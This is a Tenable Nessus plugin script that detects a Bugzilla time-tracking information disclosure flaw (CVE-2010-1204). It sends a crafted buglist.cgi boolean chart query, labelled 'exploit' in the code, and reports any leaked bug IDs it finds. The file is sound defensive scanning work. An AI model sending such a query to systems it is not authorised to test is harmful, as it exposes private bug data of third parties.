#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(47166);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2016/05/04 14:30:40 $");

  script_cve_id("CVE-2010-1204", "CVE-2010-0180", "CVE-2010-2470");
  script_bugtraq_id(41141, 41144, 41312);
  script_osvdb_id(65877, 65878, 65904);
  script_xref(name:"Secunia", value:"40300");

  script_name(english:"Bugzilla 'time-tracking' fields Information Disclosure");
  script_summary(english:"Retrieves bug listing using time-tracking fields");

  script_set_attribute(attribute:"synopsis", value:
"A CGI hosted on the remote web server is affected by an information
disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Bugzilla hosted on the remote web server allows an
unauthenticated, remote attacker to execute a boolean chart search
using time tracking fields such as 'estimated_time', 'remaining_time'
'work_time' 'actual_time', 'percentage_complete' or 'deadline' even
though the attacker is not part of the group defined by
'timetrackinggroup' parameter.

Successful exploitation of this issue could allow an attacker to
search for bugs that match one or more time tracking field criteria.

Although Nessus has not checked for it, the installed version is also
likely to be affected by a local information disclosure issue that may
allow a local user to read file 'localconfig' after checksetup.pl is
run with '$use_suexec' is set to 1 in 'localconfig'.

In addition to this, the remote version of bugzilla is also vulnerable
to an information disclosure issue due to bad permissions set to the
'localconfig' file, and the data/webdot and .bzr/ directories which
might allow local users to read files they should otherwise not have
access to.");

  script_set_attribute(attribute:"see_also", value:"http://www.bugzilla.org/security/3.2.6");
  script_set_attribute(attribute:"solution", value:"Upgrade to Bugzilla version 3.2.7, 3.4.7, 3.6.1, 3.7.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/06/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/06/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/06/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mozilla:bugzilla");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("bugzilla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Bugzilla");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = 'Bugzilla';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);
install = get_single_install(
  app_name : app,
  port     : port,
  exit_if_unknown_ver : TRUE
);

path = install["path"];
version = install["version"];

          # Advanced search
exploit = 'buglist.cgi?query_format=advanced&' +
          # Get bugs from all possible status
          'bug_status=UNCONFIRMED&bug_status=NEW&bug_status=ASSIGNED&bug_status=REOPENED&bug_status=RESOLVED&bug_status=VERIFIED&bug_status=CLOSED&' +
          # Now create our boolean chart search
          # Hours Left   ==  0.0
          'field0-0-0=remaining_time&type0-0-0=equals&value0-0-0=0.0&'      +
          # or Hours Left >  0.0
          'field0-0-1=remaining_time&type0-0-1=greaterthan&value0-0-1=0.0&' +
          # or Orig. Time == 0.0
          'field0-0-2=estimated_time&type0-0-2=equals&value0-0-2=0.0&'      +
          # or Orig. Time >  0.0
          'field0-0-3=estimated_time&type0-0-3=greaterthan&value0-0-3=0.0';

# nb :
# If our exploit is successful, we should see a listing of our search terms
# followed by bug listing. So we add couple of search terms 'remaining_time'
# and 'estimated_time', which we try to tag onto in the response.

install_loc = build_url(port:port, qs:path);
url = install_loc + exploit;

res = http_send_recv3(method:"GET",
        item:url,
        port:port,
        exit_on_fail:TRUE,
        add_headers: make_array("Cookie","LANG=en"));

# If we didn't receive an error about using 'estimated_time' or 'remaining_time' in our query
# AND
# if we were able to get search results followed by our search query description, report.

info = '';
max_bugs = 10;

if (
  "Can't use estimated_time as a field name." >!< res[2] &&  # Error on patched versions.
  "Can't use remaining_time as a field name." >!< res[2] &&  # ditto
 '<ul class="search_description">' >< res[2] && # Look for
 '<strong>Orig. Est.:</strong>'    >< res[2] && # the search
 '(is greater than)'               >< res[2] && # terms we
 '0.0'                             >< res[2] && # sent in
 '<strong>Hours Left:</strong>'    >< res[2] && # the
 '<tr class="bz_bugitem'           >< res[2] && # exploit.
 '<span class="bz_result_count">'  >< res[2] &&
 '<td class="first-child'          >< res[2] &&
 egrep(pattern:'(One|[0-9]+) (bug|issue)s? found.',string:res[2]) && # We've got results.
 egrep(pattern:'href="show_bug.cgi\\?id=[0-9]+">[0-9]+</a>',string:res[2]) # And the links to the bugs.
)
{
  if (report_verbosity > 0)
  {
    report = '\n' +
      'Nessus was able to perform a boolean chart search for bugs\n'+
      'that had Orig. Est (estimated_time) >= 0.0 or Hours Left \n'+
      '(remaining_time) >= 0.0 using the following query :\n'+
      '\n'+
      build_url(port:port, qs:url) + '\n';

    if (report_verbosity > 1)
    {
      # Get individual bug listing...
      flag      =  0;
      bug_count =  0;
      id        =  NULL;

      foreach line (split(res[2]))
      {
        if (bug_count >= max_bugs) break;

        if ('<td class="first-child' >< line)
          flag = 1;

        if (flag && ereg(pattern:'href="show_bug.cgi\\?id=[0-9]+">[0-9]+</a>',string:line))
        {
          matches = eregmatch(pattern:'href="show_bug.cgi\\?id=[0-9]+">([0-9]+)</a>',string:line);
          if (matches && matches[1])
            id = matches[1];

          if (!isnull(id) && id =~ "^[0-9]+$")
          {
            info += build_url(port:port, qs:path+"show_bug.cgi?id="+id) + '\n';
            id = NULL;
            flag = 0;
            bug_count++;
          }
        }
      }
      if (info)
        report += '\n' +
          'Here\'s the list of bugs (limited to '+ max_bugs+') that\n'+
          'matched the query : \n\n'+
          info;
    }
    security_warning(port:port,extra:report);
  }
  else security_warning(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_loc, version);
